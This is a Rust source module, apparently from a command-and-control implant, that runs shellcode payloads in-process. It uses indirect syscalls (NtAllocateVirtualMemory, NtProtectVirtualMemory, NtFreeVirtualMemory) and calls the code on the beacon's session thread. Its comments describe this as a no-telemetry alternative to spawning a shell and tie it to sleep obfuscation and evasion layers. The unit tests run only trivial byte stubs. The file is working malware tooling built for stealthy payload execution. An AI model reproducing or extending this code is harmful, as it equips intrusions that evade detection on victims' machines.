//! In-process shellcode execution (ABR-T022): position-independent code
//! delivered as a task payload runs inside the implant without a child
//! process, a new thread or a named object — the no-telemetry counterpart
//! of a `cmd.exe` shell task.
//!
//! Lifecycle through the indirect-syscall layer: RW allocation via
//! `NtAllocateVirtualMemory`, volatile copy, `NtProtectVirtualMemory` to
//! RX, a direct call on the SESSION thread, then `NtFreeVirtualMemory`.
//! Executing on the session thread preserves the single-thread invariant
//! sleep obfuscation relies on (no other thread may run implant code
//! inside the ekko-encrypted window); the price is that shellcode which
//! never returns parks the beacon — operators size their stages
//! accordingly (a stager that returns is the intended use).
//!
//! Cap: 48 KB, inside the protocol frame ceiling (~64 KiB). Larger
//! payloads stage through upload + disk or the kernel mapper.

use crate::evasion::syscalls;

const PAGE_EXECUTE_READ: usize = 0x20;
const PAGE_GRANULARITY: usize = 0x1000;
const CURRENT_PROCESS: usize = usize::MAX;
const MEM_RELEASE: usize = 0x8000;
const STATUS_MASK: u32 = 0x8000_0000;
const MAX_CODE: usize = 48_000;

/// Copies `code` to a fresh RX region and calls it with `param` in RCX
/// (the Win64 first argument). Returns the value the shellcode left in
/// RAX. The region is freed on every path, so nothing executable
/// outlives the task.
pub fn run_with_param(code: &[u8], param: usize) -> Result<usize, String> {
    if code.is_empty() {
        return Err("empty payload".into());
    }
    if code.len() > MAX_CODE {
        return Err(format!("payload {}B exceeds {}B cap", code.len(), MAX_CODE));
    }
    let size = code.len().div_ceil(PAGE_GRANULARITY) * PAGE_GRANULARITY;
    let nt_alloc = unsafe { syscalls::resolve("NtAllocateVirtualMemory") }
        .ok_or("NtAllocateVirtualMemory unresolved")?;
    let nt_protect = unsafe { syscalls::resolve("NtProtectVirtualMemory") }
        .ok_or("NtProtectVirtualMemory unresolved")?;
    let nt_free = unsafe { syscalls::resolve("NtFreeVirtualMemory") }
        .ok_or("NtFreeVirtualMemory unresolved")?;

    let mut base: usize = 0;
    let mut region = size;
    let status = unsafe {
        syscalls::dispatch6(
            nt_alloc,
            CURRENT_PROCESS,
            &mut base as *mut usize as usize,
            0,
            &mut region as *mut usize as usize,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            0x04,   // PAGE_READWRITE
        )
    };
    if (status as u32) & STATUS_MASK != 0 || base == 0 {
        return Err(format!("allocation failed: {status:#010x}"));
    }

    // Copy through RW pages, then flip the whole region RX — the region
    // is never simultaneously writable and executable.
    for (i, byte) in code.iter().enumerate() {
        unsafe { std::ptr::write_volatile((base + i) as *mut u8, *byte) };
    }
    let mut old = 0u32;
    let status = unsafe {
        syscalls::dispatch6(
            nt_protect,
            CURRENT_PROCESS,
            &mut base as *mut usize as usize,
            &mut region as *mut usize as usize,
            PAGE_EXECUTE_READ,
            &mut old as *mut u32 as usize,
            0,
        )
    };
    if (status as u32) & STATUS_MASK != 0 {
        free(nt_free, base);
        return Err(format!("protect failed: {status:#010x}"));
    }

    let entry: unsafe extern "system" fn(usize) -> usize = unsafe { std::mem::transmute(base) };
    let ret = unsafe { entry(param) };

    free(nt_free, base);
    Ok(ret)
}

/// [`run_with_param`] with no argument — the common `fn() -> usize` stage.
pub fn run(code: &[u8]) -> Result<usize, String> {
    run_with_param(code, 0)
}

fn free(nt_free: syscalls::Syscall, mut base: usize) {
    let mut zero = 0usize;
    unsafe {
        syscalls::dispatch6(
            nt_free,
            CURRENT_PROCESS,
            &mut base as *mut usize as usize,
            &mut zero as *mut usize as usize,
            MEM_RELEASE,
            0,
            0,
        )
    };
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn builtin_stage_returns_immediate() {
        // mov eax, 0x1337 ; ret
        let ret = run(&[0xB8, 0x37, 0x13, 0x00, 0x00, 0xC3]).expect("stage");
        assert_eq!(ret, 0x1337);
    }

    #[test]
    fn parameter_reaches_stage_in_rcx() {
        // mov rax, rcx ; ret — proves the argument convention.
        let ret = run_with_param(&[0x48, 0x89, 0xC8, 0xC3], 0x42).expect("stage");
        assert_eq!(ret, 0x42);
    }

    #[test]
    fn rejects_empty_and_oversized() {
        assert!(run(&[]).is_err());
        let big = vec![0xC3_u8; MAX_CODE + 1];
        let err = run(&big).unwrap_err();
        assert!(err.contains("cap"), "unexpected error: {err}");
    }
}
